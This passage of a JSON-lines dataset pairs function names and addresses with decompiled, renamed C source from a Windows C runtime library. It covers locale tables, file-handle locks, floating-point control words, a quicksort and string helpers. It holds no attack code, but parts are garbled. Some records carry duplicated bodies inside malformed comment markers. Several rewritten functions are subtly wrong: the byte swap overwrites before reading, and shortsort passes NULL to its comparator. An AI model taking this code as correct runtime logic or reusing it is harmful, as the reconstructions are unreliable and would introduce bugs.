(wchar_t *)(threadLocalDataPtr + 0x2a0), 0x55, 0);\n        \n        \n        if (localeInfo != (LPWSTR)0x0) {\n            FUN_1002d3e2(defaultLocaleIdentifier, localeInfo + 0x90, 0x55, 0);\n            int localeInfoResult = GetLocaleInfoW(defaultLocaleIdentifier, 0x1001, localeInfo, 0x40); \n            \n            if ((localeInfoResult != 0) && (localeInfoResult = GetLocaleInfoW(anotherLocaleIdentifier, 0x1002, localeInfo + 0x40, 0x40), localeInfoResult != 0)) {\n                __itow_s(codePageValue, localeInfo + 0x80, 0x10, 10); \n            }\n        }\n    }\n    return; \n}"}
{"Function Name": "___acrt_lowio_destroy_handle_array", "Address": "100352f5", "Source Code": "void __cdecl ___acrt_lowio_destroy_handle_array(LPCRITICAL_SECTION criticalSectionArray)\n{\n    \n    if (criticalSectionArray != (LPCRITICAL_SECTION)0x0) {\n        LPCRITICAL_SECTION currentCriticalSection = criticalSectionArray; \n        \n        if (criticalSectionArray != criticalSectionArray + 0x80) {\n            do {\n                DeleteCriticalSection(currentCriticalSection); \n                currentCriticalSection += 2; \n            } while (currentCriticalSection != criticalSectionArray + 0x80); \n        }\n        FID_conflict__free(criticalSectionArray); \n    }\n}"}
{"Function Name": "___acrt_lowio_lock_fh", "Address": "100353c2", "Source Code": "void __cdecl ___acrt_lowio_lock_fh(uint file_descriptor)\n{\n    \n    \n    \n    EnterCriticalSection((LPCRITICAL_SECTION)((file_descriptor & 0x3f) * 0x30 + (&critical_section_array)[file_descriptor >> 6]));\n}"}
{"Function Name": "___acrt_lowio_unlock_fh", "Address": "100353e5", "Source Code": "void __cdecl ___acrt_lowio_unlock_fh(uint file_descriptor)\n{\n    \n    \n    \n    \n    LeaveCriticalSection((LPCRITICAL_SECTION)((file_descriptor & 0x3f) * 0x30 + &critical_section_array[file_descriptor >> 6]));\n}"}
{"Function Name": "__free_osfhnd", "Address": "10035408", "Source Code": "int __cdecl __free_osfhnd(int file_handle)\n{\n    int return_value; \n    DWORD standard_handle; \n    \n    if ((-1 < file_handle) && ((uint)file_handle < DAT_10050288)) {\n        int handle_index = (file_handle & 0x3fU) * 0x30; \n        \n        \n        if (((*(byte *)(handle_index + 0x28 + (&DAT_10050088)[file_handle >> 6]) & 1) != 0) &&\n            (*(int *)(handle_index + 0x18 + (&DAT_10050088)[file_handle >> 6]) != -1)) {\n            return_value = FUN_10036b1a(); \n            \n            \n            if (return_value == 1) {\n                \n                if (file_handle == 0) {\n                    standard_handle = 0xfffffff6; \n                } else if (file_handle == 1) {\n                    standard_handle = 0xfffffff5; \n                } else if (file_handle == 2) {\n                    standard_handle = 0xfffffff4; \n                } else {\n                    goto LAB_1003546e; \n                }\n                SetStdHandle(standard_handle, (HANDLE)0x0); \n            }\n        LAB_1003546e:\n            *(undefined4 *)(handle_index + 0x18 + (&DAT_10050088)[file_handle >> 6]) = 0xffffffff; \n            return 0; \n        }\n    }\n    \n    \n    undefined4 *error_code_location = (undefined4 *)FUN_100253b8(); \n    *error_code_location = 9; \n    error_code_location = (undefined4 *)FUN_100253a5(); \n    *error_code_location = 0; \n    return -1; \n}"}
{"Function Name": "__get_osfhandle", "Address": "10035499", "Source Code": "intptr_t __cdecl __get_osfhandle(int file_handle)\n{\n    \n    if (file_handle == -2) {\n        \n        *(undefined4 *)FUN_100253a5() = 0;\n        \n        *(undefined4 *)FUN_100253b8() = 9;\n    } else {\n        \n        if ((-1 < file_handle) && ((uint)file_handle < max_file_handle)) {\n            \n            int index = (file_handle & 0x3fU) * 0x30;\n            \n            if ((*(byte *)((&file_data)[file_handle >> 6] + 0x28 + index) & 1) != 0) {\n                \n                return *(intptr_t *)((&file_data)[file_handle >> 6] + 0x18 + index);\n            }\n        }\n        \n        *(undefined4 *)FUN_100253a5() = 0;\n        \n        *(undefined4 *)FUN_100253b8() = 9;\n        \n        FUN_1001de96();\n    }\n    \n    return -1;\n}"}
{"Function Name": "FUN_10035503", "Address": "10035503", "Source Code": "uint __cdecl FUN_10035503(uint input_value)\n{\n    uint result = 0; \n    \n    if ((input_value & 0x7e80) != 0) {\n        \n        if ((char)input_value < '\\0') {\n            result = 0x10; \n        }\n        \n        if (input_value & 0x200) {\n            result |= 8; \n        }\n        \n        if (input_value & 0x400) {\n            result |= 4; \n        }\n        \n        if (input_value & 0x800) {\n            result |= 2; \n        }\n        \n        if (input_value & 0x1000) {\n            result |= 1; \n        }\n        \n        if ((input_value & 0x6000) == 0x6000) {\n            result |= 0x300; \n        } \n        \n        else if (!(input_value & 0x4000) && (input_value & 0x2000)) {\n            result |= 0x100; \n        } \n        \n        else if (input_value & 0x4000) {\n            result |= 0x200; \n        }\n    }\n    return result; \n}"}
{"Function Name": "___get_abstract_control_x87", "Address": "10035580", "Source Code": "uint __cdecl ___get_abstract_control_x87(uint input_mask)\n{\n    uint result = 0; \n    \n    if ((input_mask & 0xc3d) != 0) {\n        \n        if (input_mask & 1) result |= 0x10;\n        \n        if (input_mask & 4) result |= 8;\n        \n        if (input_mask & 8) result |= 4;\n        \n        if (input_mask & 0x10) result |= 2;\n        \n        if (input_mask & 0x20) result |= 1;\n        \n        if ((input_mask & 0xc00) == 0xc00) {\n            result |= 0x300; \n        } else if (!(input_mask & 0x800) && (input_mask & 0x400)) {\n            result |= 0x100; \n        } else if (input_mask & 0x800) {\n            result |= 0x200; \n        }\n    }\n    return result; \n}"}
{"Function Name": "___get_machine_control", "Address": "100355f3", "Source Code": "uint __cdecl ___get_machine_control(uint input_flags)\n{\n    uint result = 0; \n    if ((input_flags & 799) != 0) { \n        result = (uint)((input_flags & 0x10) != 0); \n        if (input_flags & 8) result |= 4; \n        if (input_flags & 4) result |= 8; \n        if (input_flags & 2) result |= 0x10; \n        if (input_flags & 1) result |= 0x20; \n        if ((input_flags & 0x300) == 0x300) { \n            result |= 0xc00; \n        } else if (input_flags & 0x200) { \n            result |= 0x800; \n        } else if (input_flags & 0x100) { \n            result |= 0x400; \n        }\n    }\n    return result; \n}"}
{"Function Name": "FUN_10035664", "Address": "10035664", "Source Code": "uint __cdecl FUN_10035664(uint input_value)\n{\n    uint result_value = 0; \n    \n    if ((input_value & 799) != 0) {\n        \n        if ((input_value & 0x10) != 0) {\n            result_value = 0x80; \n        }\n        \n        if ((input_value & 8) != 0) {\n            result_value |= 0x200; \n        }\n        \n        if ((input_value & 4) != 0) {\n            result_value |= 0x400; \n        }\n        \n        if ((input_value & 2) != 0) {\n            result_value |= 0x800; \n        }\n        \n        if ((input_value & 1) != 0) {\n            result_value |= 0x1000; \n        }\n        \n        if ((input_value & 0x300) == 0x300) {\n            result_value |= 0x6000; \n        } \n        \n        else if ((input_value & 0x100) == 0 && (input_value & 0x200) != 0) {\n            result_value |= 0x4000; \n        } \n        \n        else if ((input_value & 0x100) != 0) {\n            result_value |= 0x2000; \n        }\n    }\n    return result_value; \n}"}
{"Function Name": "___get_machine_status_sse2", "Address": "100356e4", "Source Code": "byte __cdecl ___get_machine_status_sse2(uint input_value)\n{\n    byte status_byte = 0; \n    \n    if ((input_value & 0x1f) != 0) {\n        \n        status_byte = (input_value & 0x10000010) == 0x10000010; \n        if ((input_value & 0x8000008) == 0x8000008) status_byte |= 4; \n        if ((input_value & 0x4000004) == 0x4000004) status_byte |= 8; \n        if ((input_value & 0x2000002) == 0x2000002) status_byte |= 0x10; \n        if ((input_value & 0x1000001) == 0x1000001) status_byte |= 0x20; \n    }\n    \n    return status_byte; \n}"}
{"Function Name": "___get_machine_status_x87", "Address": "10035745", "Source Code": "byte __cdecl ___get_machine_status_x87(uint input_value)\n{\n    byte status_flags = 0; \n    \n    if ((input_value & 0x1f) != 0) {\n        \n        status_flags = (input_value & 0x100010) == 0x100010;\n        \n        \n        if ((input_value & 0x80008) == 0x80008) status_flags |= 4;\n        \n        \n        if ((input_value & 0x40004) == 0x40004) status_flags |= 8;\n        \n        \n        if ((input_value & 0x20002) == 0x20002) status_flags |= 0x10;\n        \n        \n        if ((input_value & 0x10001) == 0x10001) status_flags |= 0x20;\n    }\n    \n    return status_flags; \n}"}
{"Function Name": "__getfpcontrolword", "Address": "100357a6", "Source Code": "uint __getfpcontrolword(void)\n{\n    uint abstractControlWordResult; \n    uint mxcsrValue; \n    ushort fpuControlWord; \n    \n    abstractControlWordResult = ___get_abstract_control_x87((uint)fpuControlWord);\n    \n    \n    mxcsrValue = (0 < DAT_1004f950) ? MXCSR : 0;\n    \n    \n    return (FUN_10035503(mxcsrValue) | abstractControlWordResult) & 799;\n}"}
{"Function Name": "__getfpstatusword", "Address": "100357e9", "Source Code": "uint __getfpstatusword(void)\n{\n    uint fpuStatusResult = 0; \n    uint mxcsrStatusResult = 0; \n    ushort fpuStatusWord = 0; \n    \n    if (0 < DAT_1004f950) {\n        uint mxcsrValue = MXCSR; \n        \n        if ((mxcsrValue & 0x3d) != 0) {\n            \n            if ((mxcsrValue & 1) != 0) {\n                mxcsrStatusResult = 0x10000010; \n            }\n            if ((mxcsrValue & 4) != 0) {\n                mxcsrStatusResult |= 0x8000008; \n            }\n            if ((mxcsrValue & 8) != 0) {\n                mxcsrStatusResult |= 0x4000004; \n            }\n            if ((mxcsrValue & 0x10) != 0) {\n                mxcsrStatusResult |= 0x2000002; \n            }\n            if ((mxcsrValue & 0x20) != 0) {\n                mxcsrStatusResult |= 0x1000001; \n            }\n        }\n    }\n    \n    if ((fpuStatusWord & 0x3d) != 0) {\n        \n        if ((fpuStatusWord & 1) != 0) {\n            fpuStatusResult = 0x100010; \n        }\n        if ((fpuStatusWord & 4) != 0) {\n            fpuStatusResult |= 0x80008; \n        }\n        if ((fpuStatusWord & 8) != 0) {\n            fpuStatusResult |= 0x40004; \n        }\n        if ((fpuStatusWord & 0x10) != 0) {\n            fpuStatusResult |= 0x20002; \n        }\n        if ((fpuStatusWord & 0x20) != 0) {\n            fpuStatusResult |= 0x10001; \n        }\n    }\n    \n    return fpuStatusResult | mxcsrStatusResult;\n}"}
{"Function Name": "__setfpcontrolword", "Address": "10035891", "Source Code": "void __cdecl __setfpcontrolword(uint control_param)\n{\n    uint current_mxcsr; \n    uint result_control_word; \n    ___get_machine_control(799); \n    ___get_machine_control(control_param); \n    current_mxcsr = MXCSR; \n    if (0 < DAT_1004f950) { \n        result_control_word = FUN_10035664(799); \n        MXCSR = FUN_10035664(control_param); \n        MXCSR = ~result_control_word & current_mxcsr | MXCSR; \n    }\n}"}
{"Function Name": "__setfpstatusword", "Address": "10035911", "Source Code": "void __cdecl __setfpstatusword(uint fpu_param)\n{\n    uint current_mxcsr; \n    byte sse2_status_mask; \n    byte sse2_status_param; \n    \n    ___get_machine_status_x87(0x1f1f001f);\n    \n    ___get_machine_status_x87(fpu_param);\n    \n    current_mxcsr = mxcsr_value; \n    \n    \n    if (0 < condition_check) {\n        \n        sse2_status_mask = ___get_machine_status_sse2(0x1f1f001f);\n        \n        sse2_status_param = ___get_machine_status_sse2(fpu_param);\n        \n        \n        mxcsr_value = ~sse2_status_mask & current_mxcsr | sse2_status_param;\n    }\n    return; \n}"}
{"Function Name": "___acrt_LCMapStringW", "Address": "10035991", "Source Code": "void __cdecl\n___acrt_LCMapStringW\n(wchar_t *param_1, ulong param_2, wchar_t *param_3, uint param_4, wchar_t *param_5, int param_6)\n{\n    \n    uint uVar1 = param_4 > 0 ? FUN_10028860(param_3, param_4) : 0;\n    \n    uint uVar2 = (param_4 > 0 && param_4 <= uVar1) ? uVar1 : uVar1 + 1;\n    \n    ___acrt_CompareStringEx_36(param_1, param_2, param_3, uVar2, param_5, param_6, (_nlsversioninfo *)0x0, (void *)0x0, 0);\n}"}
{"Function Name": "shortsort", "Address": "100359d0", "Source Code": "void __cdecl\nshortsort(char *param_1, char *param_2, uint param_3, _func_int_void_ptr_void_ptr *param_4)\n{\n    char *pcVar5; \n    char *pcVar7; \n    int iVar4;    \n    uint uVar6;   \n    void *pvVar8; \n    \n    if (param_1 < param_2) {\n        do {\n            pcVar7 = param_1; \n            \n            for (pcVar5 = param_1 + param_3; pcVar5 <= param_2; pcVar5 += param_3) {\n                pvVar8 = (void *)0x10035a0b; \n                \n                (*(code *)PTR__guard_check_icall_1003a2f8)(pcVar5, pcVar7);\n                \n                iVar4 = (*param_4)(NULL, pvVar8);\n                \n                if (iVar4 > 0) {\n                    pcVar7 = pcVar5;\n                }\n            }\n            \n            if ((pcVar7 != param_2) && (param_3 != 0)) {\n                pcVar5 = param_2; \n                uVar6 = param_3;  \n                do {\n                    char cVar2 = pcVar5[1]; \n                    pcVar5[1] = pcVar7[-1];  \n                    pcVar7[-1] = cVar2;      \n                    uVar6--;                 \n                    pcVar5++;                \n                } while (uVar6 != 0); \n            }\n            param_2 -= param_3; \n        } while (param_1 < param_2); \n    }\n    return; \n}"}
{"Function Name": "FID_conflict:_swap", "Address": "10035a70", "Source Code": "void __cdecl FID_conflict__swap(undefined *source, undefined *destination, int count)\n{\n    undefined *currentPointer; \n    \n    if ((source != destination) && (count != 0)) {\n        currentPointer = destination; \n        do {\n            currentPointer++; \n            \n            currentPointer[(int)(source + (-1 - (int)destination))] = *currentPointer;\n            \n            *currentPointer = currentPointer[(int)(source + (-1 - (int)destination)];\n            count--; \n        } while (count != 0); \n    }\n}"}
{"Function Name": "FUN_10035ab0", "Address": "10035ab0", "Source Code": "void __cdecl\nFUN_10035ab0(char *param_1,uint param_2,uint param_3,_func_int_void_ptr_void_ptr *param_4)\n{\nchar cVar1;\nundefined4 *puVar2;\nint iVar3;\nchar *pcVar4;\nchar *pcVar5;\nchar *pcVar6;\nuint uVar7;\nchar *in_stack_fffffec4;\nvoid *pvVar8;\nchar *pcVar9;\nchar *local_118;\nchar *local_114;\nchar *local_110;\nint local_10c;\nchar *local_108;\nchar *apcStack_f8 [30];\nchar *apcStack_80 [30];\nuint local_8;\nlocal_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\nlocal_108 = param_1;\nif ((((param_1 == (char *)0x0) && (param_2 != 0)) || (param_3 == 0)) ||\n(param_4 == (_func_int_void_ptr_void_ptr *)0x0)) {\npuVar2 = (undefined4 *)FUN_100253b8();\n*puVar2 = 0x16;\nFUN_1001de96();\n___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\nreturn;\n}\nlocal_10c = 0;\nif (param_2 < 2) {\nLAB_10035e3a:\n___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\nreturn;\n}\npcVar4 = param_1 + (param_2 - 1) * param_3;\nLAB_10035b35:\nwhile (uVar7 = (uint)((int)pcVar4 - (int)local_108) / param_3 + 1, 8 < uVar7) {\npcVar6 = local_108 + (uVar7 >> 1) * param_3;\npcVar5 = local_108;\npcVar9 = pcVar6;\n(*(code *)PTR__guard_check_icall_1003a2f8)();\npvVar8 = (void *)0x10035b74;\niVar3 = (*param_4)(pcVar5,pcVar9);\nif (0 < iVar3) {\nFID_conflict__swap(local_108,pcVar6,param_3);\n}\npcVar5 = local_108;\npcVar9 = pcVar4;\n(*(code *)PTR__guard_check_icall_1003a2f8)();\niVar3 = (*param_4)(pcVar5,pcVar9);\nif (0 < iVar3) {\nFID_conflict__swap(local_108,pcVar4,param_3);\n}\n(*(code *)PTR__guard_check_icall_1003a2f8)(pcVar6,pcVar4);\niVar3 = (*param_4)(in_stack_fffffec4,pvVar8);\nlocal_110 = local_108;\nlocal_118 = pcVar6;\nlocal_114 = pcVar4;\nif (0 < iVar3) {\nin_stack_fffffec4 = (char *)0x10035be2;\nFID_conflict__swap(pcVar6,pcVar4,param_3);\n}\nLAB_10035c00:\nif (local_110 < pcVar6) {\ndo {\nlocal_110 = local_110 + param_3;\nif (pcVar6 <= local_110) goto LAB_10035c41;\npvVar8 = (void *)0x10035c1e;\n(*(code *)PTR__guard_check_icall_1003a2f8)(local_110,pcVar6);\niVar3 = (*param_4)(in_stack_fffffec4,pvVar8);\n} while (iVar3 < 1);\nif (pcVar6 <= local_110) goto LAB_10035c41;\n}\nelse {\nLAB_10035c41:\ndo {\nlocal_110 = local_110 + param_3;\nif (pcVar4 < local_110) break;\npvVar8 = (void *)0x10035c51;\n(*(code *)PTR__guard_check_icall_1003a2f8)(local_110,pcVar6);\niVar3 = (*param_4)(in_stack_fffffec4,pvVar8);\n} while (iVar3 < 1);\n}\ndo {\nlocal_114 = local_114 + -param_3;\nif (local_114 <= pcVar6) break;\npvVar8 = (void *)0x10035c96;\n(*(code *)PTR__guard_check_icall_1003a2f8)(local_114,pcVar6);\niVar3 = (*param_4)(in_stack_fffffec4,pvVar8);\n} while (0 < iVar3);\nif (local_110 <= local_114) {\npcVar5 = local_114;\nuVar7 = param_3;\nif (local_110 != local_114) {\ndo {\npcVar6 = pcVar5 + 1;\ncVar1 = pcVar6[(int)(local_110 + (-1 - (int)local_114))];\npcVar6[(int)(local_110 + (-1 - (int)local_114))] = *pcVar5;\n*pcVar5 = cVar1;\nuVar7 = uVar7 - 1;\npcVar5 = pcVar6;\npcVar6 = local_118;\n} while (uVar7 != 0);\n}\nif (pcVar6 == local_114) {\nlocal_118 = local_110;\npcVar6 = local_110;\n}\ngoto LAB_10035c00;\n}\nlocal_114 = local_114 + param_3;\nif (pcVar6 < local_114) {\ndo {\nlocal_114 = local_114 + -param_3;\nif (local_114 <= pcVar6) goto LAB_10035d51;\npvVar8 = (void *)0x10035d34;\n(*(code *)PTR__guard_check_icall_1003a2f8)(local_114,pcVar6);\niVar3 = (*param_4)(in_stack_fffffec4,pvVar8);\n} while (iVar3 == 0);\nif (local_114 <= pcVar6) goto LAB_10035d51;\n}\nelse {\nLAB_10035d51:\ndo {\nlocal_114 = local_114 + -param_3;\nif (local_114 <= local_108) break;\npvVar8 = (void *)0x10035d65;\n(*(code *)PTR__guard_check_icall_1003a2f8)(local_114,pcVar6);\niVar3 = (*param_4)(in_stack_fffffec4,pvVar8);\n} while (iVar3 == 0);\n}\nif ((int)local_114 - (int)local_108 < (int)pcVar4 - (int)local_110) goto LAB_10035dcb;\nif (local_108 < local_114) {\napcStack_80[local_10c] = local_108;\napcStack_f8[local_10c] = local_114;\nlocal_10c = local_10c + 1;\n}\nlocal_108 = local_110;\nif (pcVar4 <= local_110) goto LAB_10035e12;\n}\nshortsort(local_108,pcVar4,param_3,param_4);\nin_stack_fffffec4 = local_108;\ngoto LAB_10035e12;\nLAB_10035dcb:\nif (local_110 < pcVar4) {\napcStack_80[local_10c] = local_110;\napcStack_f8[local_10c] = pcVar4;\nlocal_10c = local_10c + 1;\n}\npcVar4 = local_114;\nif (local_114 <= local_108) {\nLAB_10035e12:\nlocal_10c = local_10c + -1;\nif (-1 < local_10c) {\nlocal_108 = apcStack_80[local_10c];\npcVar4 = apcStack_f8[local_10c];\ngoto LAB_10035b35;\n}\ngoto LAB_10035e3a;\n}\ngoto LAB_10035b35;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_fc : undefined4\nLocal Variable: local_100 : undefined4\nLocal Variable: local_104 : undefined4\nLocal Variable: local_108 : undefined4\nLocal Variable: local_10c : undefined4\nLocal Variable: local_110 : undefined4\nLocal Variable: local_114 : undefined4\nLocal Variable: local_118 : undefined4\nLocal Variable: local_11c : undefined4\nLocal Variable: local_120 : undefined4"}
{"Function Name": "common_tcsncpy_s<char>", "Address": "10035e4a", "Source Code": "\\*\nint __cdecl common_tcsncpy_s<char>(char *destination_buffer, uint source_size, char *source_buffer, uint copy_length) {\n    char current_char; \n    int *error_code_ptr; \n    uint remaining_copy_length = copy_length; \n    uint source_length = source_size; \n    char *destination_ptr; \n    \n    if (copy_length == 0) {\n        \n        if (destination_buffer == (char *)0x0 && source_size == 0) {\n            return 0;\n        }\n    } else {\n        \n        if (source_size != 0) {\n            \n            if (copy_length == 0) {\n                *destination_buffer = '\\0'; \n                return 0; \n            }\n            \n            if (source_buffer != (char *)0x0) {\n                destination_ptr = destination_buffer; \n                \n                if (copy_length == 0xffffffff) {\n                    do {\n                        current_char = destination_ptr[(int)source_buffer - (int)destination_buffer]; \n                        *destination_ptr++ = current_char; \n                        if (current_char == '\\0') break; \n                        source_length--; \n                    } while (source_length != 0); \n                } else {\n                    do {\n                        current_char = destination_ptr[(int)source_buffer - (int)destination_buffer]; \n                        *destination_ptr++ = current_char; \n                        if ((current_char == '\\0') || (source_length-- == 1)) break; \n                        remaining_copy_length--; \n                    } while (remaining_copy_length != 0); \n                    \n                    if (remaining_copy_length == 0) {\n                        *destination_ptr = '\\0'; \n                    }\n                }\n                \n                if (source_length != 0) {\n                    return 0; \n                }\n                \n                if (copy_length == 0xffffffff) {\n                    destination_buffer[source_size - 1] = '\\0'; \n                    return 0x50; \n                }\n                *destination_buffer = '\\0'; \n                error_code_ptr = (int *)FUN_100253b8(); \n                goto LAB_10035e8c; \n            }\n            *destination_buffer = '\\0'; \n        }\n    }\n    \n    if (destination_buffer != (char *)0x0) {\n        goto LAB_10035e6c; \n    }\n    error_code_ptr = (int *)FUN_100253b8(); \n    LAB_10035e8c:\n    *error_code_ptr = 0x16; \n    FUN_1001de96(); \n    return 0x16; \n}\n*\\ \n \nint __cdecl common_tcsncpy_s<char>(char *destination_buffer, uint source_size, char *source_buffer, uint copy_length) {\n    char current_char;\n    int *error_code_ptr;\n    uint remaining_copy_length = copy_length;\n    uint source_length = source_size;\n    char *destination_ptr;\n    if (copy_length == 0) {\n        if (destination_buffer == (char *)0x0 && source_size == 0) {\n            return 0;\n        }\n    } else {\n        if (source_size != 0) {\n            if (copy_length == 0) {\n                *destination_buffer = '\\0';\n                return 0;\n            }\n            if (source_buffer != (char *)0x0) {\n                destination_ptr = destination_buffer;\n                if (copy_length == 0xffffffff) {\n                    do {\n                        current_char = destination_ptr[(int)source_buffer - (int)destination_buffer];\n                        *destination_ptr++ = current_char;\n                        if (current_char == '\\0') break;\n                        source_length--;\n                    } while (source_length != 0);\n                } else {\n                    do {\n                        current_char = destination_ptr[(int)source_buffer - (int)destination_buffer];\n                        *destination_ptr++ = current_char;\n                        if ((current_char == '\\0') || (source_length-- == 1)) break;\n                        remaining_copy_length--;\n                    } while (remaining_copy_length != 0);\n                    if (remaining_copy_length == 0) {\n                        *destination_ptr = '\\0';\n                    }\n                }\n                if (source_length != 0) {\n                    return 0;\n                }\n                if (copy_length == 0xffffffff) {\n                    destination_buffer[source_size - 1] = '\\0';\n                    return 0x50;\n                }\n                *destination_buffer = '\\0';\n                error_code_ptr = (int *)FUN_100253b8();\n                goto LAB_10035e8c;\n            }\n            *destination_buffer = '\\0';\n        }\n    }\n    if (destination_buffer != (char *)0x0) {\n        goto LAB_10035e6c;\n    }\n    error_code_ptr = (int *)FUN_100253b8();\n    LAB_10035e8c:\n    *error_code_ptr = 0x16;\n    FUN_1001de96();\n    return 0x16;\n}"}
{"Function Name": "FUN_10035efb", "Address": "10035efb", "Source Code": "void __cdecl FUN_10035efb(char *destination, uint dest_size, char *source, uint source_size)\n{\n    \n    \n    \n    common_tcsncpy_s(destination, dest_size, source, source_size);\n}"}
{"Function Name": "_strpbrk", "Address": "10035f10", "Source Code": "char * __cdecl _strpbrk(char *inputString, char *controlString)\n{\n    byte currentChar; \n    byte *unusedPointer; \n    byte charPresenceBitmap[32] = {0}; \n    \n    while ((currentChar = *controlString++) != 0) {\n        charPresenceBitmap[currentChar >> 3] |= 1 << (currentChar & 7); \n    }\n    \n    \n    while ((currentChar = *(inputString++)) != 0) {\n        \n        if (charPresenceBitmap[currentChar >> 3] & (1 << (currentChar & 7))) {\n            return (char *)(inputString - 1); \n        }\n    }\n    \n    return NULL; \n}"}
{"Function Name": "__mbsdec", "Address": "10035f50", "Source Code": "\\*\nuchar * __cdecl __mbsdec(uchar *startPointer, uchar *currentPosition)\n{\n    \n    return __mbsdec_l(startPointer, currentPosition, (_locale_t)0x0);\n}\n*\\ \n \nuchar * __cdecl __mbsdec(uchar *startPointer, uchar *currentPosition)\n{\n    return __mbsdec_l(startPointer, currentPosition, (_locale_t)0x0);\n}"}
{"Function Name": "GetTableIndexFromLocaleName", "Address": "10036003", "Source Code": "int __cdecl GetTableIndexFromLocaleName(wchar_t *locale_name)\n{\n    ushort comparison_result; \n    int midpoint_index; \n    ushort current_char; \n    ushort *locale_entry_ptr; \n    int upper_bound = 0xe3; \n    int lower_bound = 0; \n    while (true) { \n        midpoint_index = (upper_bound + lower_bound) / 2; \n        locale_entry_ptr = (ushort *)(&PTR_DAT_10042728)[midpoint_index * 2]; \n        int offset = (int)locale_name - (int)locale_entry_ptr; \n        int char_count = 0x55; \n        do { \n            current_char = *(ushort *)(offset + (int)locale_entry_ptr); \n            if ((0x40 < current_char) && (current_char < 0x5b)) { \n                current_char += 0x20; \n            }\n            comparison_result = *locale_entry_ptr; \n            if ((0x40 < comparison_result) && (comparison_result < 0x5b)) { \n                comparison_result += 0x20; \n            }\n            locale_entry_ptr++; \n            char_count--; \n        } while ((char_count != 0) && (current_char != 0) && (current_char == comparison_result)); \n        if ((uint)current_char == (uint)comparison_result) break; \n        if ((int)((uint)current_char - (uint)comparison_result) < 0) { \n            upper_bound = midpoint_index - 1; \n        } else {\n            lower_bound = midpoint_index + 1; \n        }\n        if (upper_bound < lower_bound) { \n            return -1; \n        }\n    }\n    return *(int *)(&UNK_1004272c + midpoint_index * 8); \n}"}
{"Function Name": "___acrt_DownlevelLCIDToLocaleName", "Address": "100360bf", "Source Code": "int __cdecl ___acrt_DownlevelLCIDToLocaleName(int locale_id, wchar_t *locale_name_buffer, rsize_t buffer_size)\n{\n    int locale_index; \n    uint locale_name_length; \n    errno_t error_code; \n    int upper_bound = 0xe3; \n    int lower_bound = 0; \n    \n    if ((((locale_id != 0) && (locale_id != 0x400)) && (locale_id != 0x800)) &&\n        ((locale_name_buffer != (wchar_t *)0x0 || ((int)buffer_size < 1)) && (-1 < (int)buffer_size)))) {\n        \n        \n        do {\n            locale_index = (upper_bound + lower_bound) / 2; \n            if (locale_id == *(int *)(&DAT_10041608 + locale_index * 8)) goto LAB_10036120; \n            if (locale_id - *(int *)(&DAT_10041608 + locale_index * 8) < 0) {\n                upper_bound = locale_index - 1; \n            } else {\n                lower_bound = locale_index + 1; \n            }\n        } while (lower_bound <= upper_bound); \n        \n        locale_index = -1; \n    LAB_10036120:\n        \n        if (locale_index >= 0) {\n            wchar_t *locale_name = *(wchar_t **)(&UNK_1004160c + locale_index * 8); \n            locale_name_length = FUN_10028860(locale_name, 0x55); \n            if ((int)buffer_size > 0) { \n                if ((int)buffer_size <= (int)locale_name_length) {\n                    return 0; \n                }\n                error_code = _wcscpy_s(locale_name_buffer, buffer_size, locale_name); \n                if (error_code != 0) {\n                    __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n                }\n            }\n            return locale_name_length + 1; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "___acrt_DownlevelLocaleNameToLCID", "Address": "10036169", "Source Code": "undefined4 __cdecl ___acrt_DownlevelLocaleNameToLCID(wchar_t *locale_name)\n{\n    \n    if (locale_name != (wchar_t *)0x0) {\n        \n        uint locale_index = GetTableIndexFromLocaleName(locale_name);\n        \n        \n        if (locale_index < 0xe4) {\n            \n            return *(undefined4 *)(&DAT_10041608 + locale_index * 8);\n        }\n    }\n    \n    return 0;\n}"}
{"Function Name": "__putwch_nolock", "Address": "10036195", "Source Code": "wint_t __cdecl __putwch_nolock(wchar_t characterToWrite)\n{\n    \n    if (consoleOutputHandle == (HANDLE)0xfffffffe) {\n        \n        ___dcrt_lowio_initialize_console_output();\n    }\n    \n    \n    if (consoleOutputHandle == (HANDLE)0xffffffff || !WriteConsoleW(consoleOutputHandle, &characterToWrite, 1, NULL, NULL)) {\n        \n        characterToWrite = L'\\xffff';\n    }\n    \n    \n    return characterToWrite;\n}"}
{"Function Name": "___libm_error_support", "Address": "100361da", "Source Code": "void __cdecl\n___libm_error_support(undefined8 *param_1, undefined8 *param_2, undefined8 *param_3, int param_4)\n{\n    code *pcVar2; \n    int iVar3; \n    undefined4 *puVar4; \n    undefined4 local_28; \n    char *local_24; \n    undefined8 local_20; \n    undefined8 local_18; \n    undefined8 local_10; \n    uint local_8; \n    \n    local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    \n    pcVar2 = (DAT_10050478 == 0) ? ___acrt_invoke_user_matherr : (code *)DecodePointer(DAT_10050524);\n    \n    if (0x1a < param_4) {\n        \n        if (param_4 == 0x1b) {\n            local_28 = 2; \n            local_24 = \"pow\"; \n        } else if (param_4 == 0x1c) {\n            local_24 = \"pow\"; \n        } else if (param_4 == 0x31) {\n            local_24 = \"sqrt\"; \n        } else if (param_4 == 0x3a) {\n            local_24 = \"acos\"; \n        } else if (param_4 == 0x3d) {\n            local_24 = \"asin\"; \n        } else if (param_4 == 1000 || param_4 == 0x3e9) {\n            *param_3 = *param_1; \n            goto LAB_100363e2; \n        } else {\n            goto LAB_100363e2; \n        }\n    } else if (param_4 == 0x1a) {\n        *param_3 = 0x3ff0000000000000; \n        goto LAB_100363e2; \n    } else if (param_4 < 0xf) {\n        \n        if (param_4 == 0xe) {\n            local_28 = 3; \n            local_24 = \"exp\"; \n        } else if (param_4 == 3) {\n            local_24 = \"log\"; \n        } else if (param_4 == 8) {\n            local_28 = 2; \n            local_24 = \"log10\"; \n        } else if (param_4 == 9) {\n            local_24 = \"log10\"; \n        } else {\n            local_28 = 1; \n            local_20 = *param_1; \n            local_18 = *param_2; \n            local_10 = *param_3; \n            (*(code *)PTR__guard_check_icall_1003a2f8)(&local_28); \n            iVar3 = (*pcVar2)(); \n            if (iVar3 == 0) {\n                puVar4 = (undefined4 *)FUN_100253b8(); \n                *puVar4 = 0x21; \n            }\n            goto LAB_100363dd; \n        }\n        \n        local_20 = *param_1;\n        local_18 = *param_2;\n        local_10 = *param_3;\n        (*(code 